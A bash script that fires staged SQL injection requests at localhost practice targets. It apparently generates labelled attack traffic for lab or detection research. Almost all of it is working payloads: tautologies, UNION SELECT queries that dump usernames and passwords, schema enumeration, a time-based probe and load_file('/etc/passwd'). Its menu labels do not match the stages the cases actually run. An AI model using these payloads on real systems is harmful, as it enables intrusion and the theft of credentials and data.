#!/bin/bash
shopt -s expand_aliases
help() {
    echo "1) Option 1 - Using the website normally."
    echo "2) Option 2 - Running reconaissance attacks."
    echo "3) Option 3 - Attacking the Database."
    echo "4) Option 4 - Egressing data from the database."
    echo "5) Option 5 - Attacking the underlying operating system."
    echo "6) Option 6 - Destroying data and web service."
}

alias call="wget -O /dev/null"
repeat_count=10

case $1 in

    1)
     for i in `seq 1 3600`
     do
         #Using Attack 58 from CSIT: Vl-VL-N - 9%
         #select a random number between 0 and 5
         j=$(( RANDOM%5+0 ))

         call "http://localhost:8080/bhratach/flag/extranet/sqli/?id=$j#&Submit=Submit#"
         sleep 2
     done
     ;;


    2) echo "You chose to run reconnaissance attacks."
       #All attacks will have a probability less than or equal to 36%
       for rec in `seq 1 $repeat_count`
       do
           #Using Attack 1 from CSIT: Vl-VL-NE - 19%
           call "http://localhost:8080/bhratach/flag/extranet/sqli/?id=;"
           sleep 2
           #Using Attack 2 from CSIT: Vl-VL-NE - 19%
           call "http://localhost:8080/bhratach/flag/extranet/sqli/?id=)"
           sleep 2
           #Using Attack 58 from CSIT: Vl-VL-N - 9%
           call "http://localhost:8080/bhratach/flag/extranet/sqli/?id=1aaaaaa"
           sleep 2
           #Using Attack 284 from CSIT: l-L-NE - 29%
           call "http://localhost:8080/bhratach/flag/extranet/sqli/?id=news"
           sleep 2
           #Using Attack 374 from CSIT: l-L-NE - 29%
           call "http://localhost:8080/bhratach/flag/extranet/sqli/?id='or'2'='2--"
           sleep 2
           #Using Attack 446 from CSIT: l-L-NE - 29%
           call "http://localhost:8080/bhratach/flag/extranet/sqli/?id='or'1'='1--"
           sleep 2
           #Using Attack 26 from CSIT: Vl-L-SE - 36%
           call "http://localhost:8080/sql-lab/Less-7/?id=%22"
           sleep 2
           #Using Attack 102 from CSIT: Vl-L-SE - 36%
           call "http://localhost:8080/sql-lab/Less-5/?id=1%5c"
           sleep 2
           #Using Attack 125 from CSIT: Vl-L-SE - 36%
           call "http://localhost:8080/sql-lab/Less-1/?id=1%27%20--+"
           sleep 2
           #Using Attack 124 from CSIT: Vl-VL-NE - 19%
           call "http://localhost:8080/bhratach/flag/extranet/sqli/?id=1%22"
           sleep 2
           #Using Attack 98 from CSIT: Vl-L-SE - 36%
           call "http://localhost:8080/sql-lab/Less-5/?id=1%22)"
           sleep 2
       done
       ;;



    3) echo "You chose to Attack the Database."
       #All attacks will have a probability between 36% and 50%
       for rec in 1
       do
           echo "Starting Next Database Attack No:$rec"
           #Using Attack 130 from CSIT: Vl-L-E - 43%
           call "http://localhost:8080/sql-lab/Less-1/?id='or1=1--"
           sleep 2
           echo "Starting Next Database Attack No:$rec"
           #Using Attack 130 from CSIT: M-L-SE - 50%
           call "http://localhost:8080/bhratach/flag/extranet/sqli/?id='or2'=2'--"
           sleep 2
           echo "Starting Next Database Attack No:$rec"
           #Using Attack 221 from CSIT: M-L-SE - 50%
           call "http://localhost:8080/bhratach/flag/extranet/sqli/?id='or1'='1--"
           sleep 2
           echo "Starting Next Database Attack No:$rec"
           #Using Attack 222 from CSIT: M-L-SE - 50%
           call "http://localhost:8080/bhratach/flag/extranet/sqli/?id='or5'='5'--"
           sleep 2
           echo "Starting Next Database Attack No:$rec"
           #Using Attack 306 from CSIT: L-L-SE - 50%
           call "http://localhost:8080/bhratach/flag/extranet/sqli/?id=14'%20--+"
           sleep 2
           echo "Starting Next Database Attack No:$rec"
           #Using Attack 319 from CSIT: L-L-SE - 50%
           call "http://localhost:8080/bhratach/flag/extranet/sqli/?id='or0=0--"
           sleep 2
           echo "Starting Next Database Attack No:$rec"
           #Using Attack 330 from CSIT: L-L-SE - 50%
           call "http://localhost:8080/bhratach/flag/extranet/sqli/?id='or8'=8'--"
           sleep 2
           echo "Starting Next Database Attack No:$rec"
           #Using Attack 490 from CSIT: M-L-SE - 50%
           call "http://localhost:8080/bhratach/flag/extranet/sqli/?id='or11'='11'--"
           sleep 2
           echo "Starting Next Database Attack No:$rec"
           #Using Attack 132 from CSIT: VL-L-SE - 43%
           call "http://localhost:8080/sql-lab/Less-1/?id=10'%20--+"
           sleep 2
       done
       ;;

    4) echo "Egressing data from the database"
    #All attacks will have a probability between 36% and 50%
       for rec in 1
       do
           #Using Attack 130 from CSIT: Vl-L-E - 43%
           call "http://localhost:8080/sql-lab/Less-1/?id=1%22)--+"
           sleep 2
           #Using Attack 130 from CSIT: M-L-SE - 50%
           call "http://localhost:8080/bhratach/flag/extranet/sqli/?id=1%5C%20/*+*/"
           sleep 2
           #Using Attack 221 from CSIT: M-L-SE - 50%
           call "http://localhost:8080/bhratach/flag/extranet/sqli/?id=1%5C%20--+"
           sleep 2
           #Using Attack 222 from CSIT: M-L-SE - 50%
           call "http://localhost:8080/bhratach/flag/extranet/sqli/?id=1%27%20and%20%271"
           sleep 2
           #Using Attack 306 from CSIT: L-L-SE - 50%
           call "http://localhost:8080/bhratach/flag/extranet/sqli/?id=1%27%20union%20select%201,2,3%20--+"
           sleep 2
           #Using Attack 319 from CSIT: L-L-SE - 50%
           call "http://localhost:8080/bhratach/flag/extranet/sqli/?id=1'%20and%20'1"
           sleep 2
           #Using Attack 330 from CSIT: L-L-SE - 50%
           call "http://localhost:8080/bhratach/flag/extranet/sqli/?id=-6%27%20union%20select%205,database,%203%20AND%201=%271"
           sleep 2
           #Using Attack 490 from CSIT: M-L-SE - 50%
           call "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%25'%20or%2011=11%20union%20select%20null,%20version()%20"
           sleep 2
           #Using Attack 491 from CSIT: M-L-SE - 50%
           call "http://localhost:8080/bhratach/flag/extranet/sqli/?id='or'1='1--"
           sleep 2
           #Using Attack 132 from CSIT: VL-L-SE - 43%
           call "http://localhost:8080/sql-lab/Less-1/?id=20'+union+select+1,4version(),5%20--+"
           sleep 2
           #echo "Starting Next Database Attack No:$rec"
           #call "http://localhost:8080/sql-lab/Less-5/?id=1' AND%20(select%201%20from%20(select%20count(*),%20concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database()limit 3,1),0x3a,0x3a,%20round(rand()*2,1))a%20from%20information_schema.columns%20group%20by%20a)b)%20%20%20%20--+"
           #sleep 2
       done
       ;;


    5) echo "Egressing data from the database."
       #All attacks will have a probability between 50% and 70%
       for rec in 1
       do
           #Using Attack 138 from CSIT: L-L-E - 60%
           call "http://localhost:8080/sql-lab/Less-1/?id=999'+union+select+1,database(),5%20--+"
           sleep 2
           #Using Attack 137 from CSIT: L-L-E - 60%
           call "http://localhost:8080/sql-lab/Less-1/?id=-6%27%20union%20select%205,database(),%203%20AND%20%271"
           sleep 2
           #Using Attack 143 from CSIT: L-L-E - 60%
           call "http://localhost:8080/sql-lab/Less-1/?id='%20union%20select%207,concat(table_name,0x0a,column_name)%20from%20information_schema.columns%20where%20table_name=%20'users'%20"
           sleep 2
           #Using Attack 180 from CSIT: M-M-SE - 60%
           call "http://localhost:8080/sql-lab/Less-1/?id=20'+union+select+1,2,3%20--+"
           sleep 2
           #Using Attack 186 from CSIT: M-M-SE - 60%
           call "http://localhost:8080/sql-lab/Less-1/?id=1'%5C)--+"
           sleep 2
           #Using Attack 199 from CSIT: M-M-SE - 60%
           call "http://localhost:8080/sql-lab/Less-1/?id=1'%20AND%20if((select%20database())=%22security%22,SLEEP(5),null)%20--+"
           sleep 2
           #Using Attack 238 from CSIT: M-M-SE - 60%
           call "http://localhost:8080/bhratach/flag/extranet/sqli/?id=20%27+union+select+1,table_name,3%20from%20information_schema.tables%20where%20table_schema=database()%20limit%204,1%20--+"
           sleep 2
           #Using Attack 242 from CSIT: M-M-SE - 60%
           call "http://localhost:8080/bhratach/flag/extranet/sqli/?id=20%27+union+select+1,group_concat(username),3%20from%20users--+"
           sleep 2
           #Using Attack 415 from CSIT: L-L-SE - 60%
           call "http://localhost:8080/bhratach/flag/extranet/sqli/?id=20%27+union+select+1,group_concat(username),group_concat(password)%20from%20users--+"
           sleep 2
       done
       ;;

    6) echo "Attacking the underlying operating system."
       #All attacks will have a probability greater than or equal to 70%
       for rec in 1
       do
           #Using Attack 66 from CSIT: M-ML-E - 70%
           call "http://localhost:8080/sql-lab/Less-6/?id='%20union%20select%20null,@@datadir%20"
           sleep 2
           #Using Attack 139 from CSIT: ML-ML-E - 70%
           call "http://localhost:8080/sql-lab/Less-1/?id='%20union%20select%20null,@@datadir%20"
           sleep 2
           #Using Attack 162 from CSIT: M-MH-E - 70%
           call "http://localhost:8080/sql-lab/Less-1/?id='%20union%20select%203,concat(first_name,0x0a,password)%20from%20users%20"
           sleep 2
           #Using Attack 157 from CSIT: M-M-E - 70%
           call "http://localhost:8080/sql-lab/Less-1/?id='%20union%20select%2010,concat(first_name,0x0a,password)%20from%20users%20"
           sleep 2
           #Using Attack 162 from CSIT: M-M-E - 70%
           call "http://localhost:8080/sql-lab/Less-1/?id='%20union%20select%201,concat(first_name,0x0a,password)%20from%20users%20"
           sleep 2
           #Using Attack 257 from CSIT: M-H-E - 70%
           call "http://localhost:8080/bhratach/flag/extranet/sqli/?id='%20union%20select%2010,concat(first_name,0x0a,password)%20from%20users%20"
           sleep 2
           #Using Attack 258 from CSIT: M-M-E - 70%
           call "http://localhost:8080/bhratach/flag/extranet/sqli/?id='%20union%20select%209,concat(first_name,0x0a,password)%20from%20users%20"
           sleep 2
           #Using Attack 283 from CSIT: M-H-E - 70%
           call "http://localhost:8080/bhratach/flag/extranet/sqli/?id='%20union%20select%20null,concat(first_name,0x0a,password)%20from%20users%20"
           sleep 2
           #Using Attack 259 from CSIT: M-H-E - 70%
           call "http://localhost:8080/bhratach/flag/extranet/sqli/?id='%20union%20select%20null,@@datadir%20"
           sleep 2
           #Using Attack 282 from CSIT: M-H-E - 70%
           call "http://localhost:8080/bhratach/flag/extranet/sqli/?id='%20union%20all%20select%20load_file('/etc/passwd'),null%20"
           sleep 2
       done
       ;;
    *) help ;;
esac
